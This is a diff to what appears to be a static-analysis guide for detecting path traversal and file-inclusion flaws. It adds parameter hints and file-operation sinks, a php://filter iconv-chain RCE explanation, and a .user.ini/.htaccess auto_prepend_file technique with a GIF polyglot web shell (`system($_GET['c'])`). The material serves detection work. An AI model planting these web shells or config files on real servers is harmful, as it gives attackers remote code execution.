@@ -61,7 +61,7 @@ The core pattern: *unvalidated user input reaches a filesystem operation and the
 
 ### Surface Map
 
-- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
+- HTTP params (source param-name hints — prioritization only, never a standalone finding; a name match means *trace the value to a file-op sink below*, tokenizing compounds like `filePath`→`file`,`path`): `file`, `filename`, `filepath`, `path`, `php_path`, `template`, `include`, `page`, `pg`, `view`, `download`, `upload`, `attachment`, `document`, `doc`, `pdf`, `export`, `report`, `log`, `dir`, `folder`, `root`, `style`, `theme`, `lang`, `locale`, `name`, `src`, `url`, `image`, `font`, `resource`
 - Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
 - Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
 - Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
@@ -80,14 +80,15 @@ The core pattern: *unvalidated user input reaches a filesystem operation and the
 Flag file operations where the path argument is dynamic (variable, not a fully hardcoded literal):
 
 - **Python**: `open(`, `os.path.join(`, `pathlib.Path(`, `.read_text(`, `.read_bytes(`, `send_file(`, `FileResponse(`
-- **Node.js**: `fs.readFile`, `fs.readFileSync`, `fs.createReadStream`, `path.join(`, `path.resolve(`, `res.sendFile`, `res.download`
+- **Node.js**: `fs.readFile`, `fs.readFileSync`, `fs.createReadStream`, `path.join(`, `path.resolve(`, `res.sendFile`, `res.download`, `express.static(var)` (dynamic/user-derived root)
 - **PHP**: `file_get_contents(`, `fopen(`, `readfile(`, `include(`, `require(`, `include_once(`, `require_once(`
-- **Ruby**: `File.read(`, `File.open(`, `IO.read(`, `send_file `
-- **Java**: `new File(`, `new FileInputStream(`, `Files.readAllBytes(`, `Paths.get(`, `UrlResource(`
-- **Go**: `os.Open(`, `os.ReadFile(`, `filepath.Join(`, `http.ServeFile(`
+- **Ruby**: `File.read(`, `File.open(`, `IO.read(`, `send_file `, `render file: var` / `render template: var`
+- **Java**: `new File(`, `new FileInputStream(`, `Files.readAllBytes(`, `Paths.get(`, `UrlResource(`, Spring `ClassPathResource(var)` / `ResourceLoader.getResource(var)` / `ResourceUtils.getFile(var)`
+- **Go**: `os.Open(`, `os.ReadFile(`, `filepath.Join(`, `http.ServeFile(`, `http.ServeContent(w, r, var, ...)`
 - **C#**: `File.ReadAllText(`, `File.ReadAllBytes(`, `new FileStream(`, `Path.Combine(`
 - **Path construction joins**: `os.path.join(BASE, var)`, `path.join(__dirname, var)`, `Paths.get(base).resolve(var)`, string concat `` `${base}/${var}` ``
-- **Archive extraction**: `zipfile.ZipFile.extractall`, `tarfile.extractall`, `ZipEntry.getName()` as output path, Node `adm-zip`/`node-tar` extract calls
+- **Archive extraction**: `zipfile.ZipFile.extractall`, `tarfile.extractall`, `ZipEntry.getName()` as output path, Node `adm-zip`/`node-tar`/`unzipper` extract calls
+- **Java guard nuance**: `Paths.get(base).resolve(var).normalize().startsWith(base)` is only sound when `base` was canonicalized first (`toRealPath()`); comparing against a non-real base lets a symlink or prefix sibling (`/safe-evil`) defeat the `startsWith` check.
 
 Skip: fully hardcoded paths, config/env-only paths with no user component, fixed-root static middleware (e.g. `express.static('public')`).
 
@@ -498,6 +499,44 @@ include($_GET['page']);
 
 // Detection: any include/require with user input = LFI at minimum; check php.ini for allow_url_include
 ```
+
+### php://filter convert.iconv Filter-Chain RCE (no upload, no log, no writable dir)
+
+**The single most important severity driver for an `include()`/`require()` LFI sink.** `php://filter` is a stream filter applied to a **local** resource — it is **not** a URL include — so it is gated by **neither** `allow_url_include` **nor** `allow_url_fopen`. By chaining many `convert.iconv.<enc1>.<enc2>` steps together with `convert.base64-decode`, an attacker makes the *wrapper string itself* materialize arbitrary executable PHP bytes, which `include`/`require` then runs. No file upload, no readable/poisonable log, no writable directory, and no remote-URL settings are required. Public chain generators emit the full filter string from a target PHP payload.
+
+```php
+// VULNERABLE — include() sink reachable with a php://filter chain
+include($_GET['page']);                 // or include('templates/' . $_GET['tpl'] . '.php')
+// Attacker (one long generated string), shape:
+//   page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp
+// -> the chain emits `<?php system($_GET["c"]); ?>` which include() executes -> RCE
+// Works even when: allow_url_include=Off, allow_url_fopen=Off, no upload, no readable logs,
+//                  web root not writable, and the sink appends ".php" (the filter operates on the stream).
+```
+
+**Severity rule (raises the ceiling):** when the sink is **`include`/`require`/`include_once`/`require_once`** (code execution) AND a `php://` wrapper is reachable (not stripped by an allowlist/`basename`/scheme filter), treat the finding as **Critical (RCE)** by default — the filter-chain completes with none of the classic preconditions. Only a **read-only** sink (`readfile`/`file_get_contents`/`fopen`/`file`/`fpassthru`) without an include caps the ceiling at source/secret disclosure. Do **not** downgrade an include-sink LFI to "Medium, read-only" merely because there is no upload, no log access, and `allow_url_include=Off`.
+
+**Grep seeds**: `php://filter` adjacent to `include(`/`require(`; `convert.iconv`; `convert.base64-decode`; long `php://filter/...|...|resource=` strings in tests/logs.
+
+### .user.ini / .htaccess auto_prepend_file → RCE
+
+When an upload (or any attacker-controlled file write) can land a file in or beside a directory where PHP executes, a dropped config file forces the server to auto-include attacker PHP on **every** request to that directory — RCE without needing any LFI parameter once it lands. `auto_prepend_file` (and `auto_append_file`) is honored from `.user.ini` on PHP-FPM/CGI and from `.htaccess` on Apache + mod_php.
+
+```ini
+; .user.ini (PHP-FPM/CGI) — auto-includes the polyglot shell on every .php hit in this dir
+auto_prepend_file=shell.gif
+```
+```apache
+# .htaccess (Apache + mod_php) — treat .gif as PHP, or force auto-prepend
+AddType application/x-httpd-php .gif
+php_value auto_prepend_file shell.gif
+```
+```php
+# shell.gif — image magic bytes pass content checks; PHP runs on include
+GIF89a<?php system($_GET['c']); ?>
+```
+
+**SAST angle**: an upload feature that does not pin the destination filename/extension to a server-side allowlist (lets `.user.ini`/`.htaccess`/`.gif`-as-PHP land in a PHP-served dir) is an **RCE** path, not merely "unrestricted upload" — cross-reference `arbitrary_file_upload.md`. **Grep seeds**: `auto_prepend_file`, `auto_append_file`, `.user.ini`, `.htaccess`, `AddType`, `php_value`, `application/x-httpd-php`.
 
 ### PHP Session File Inclusion
 
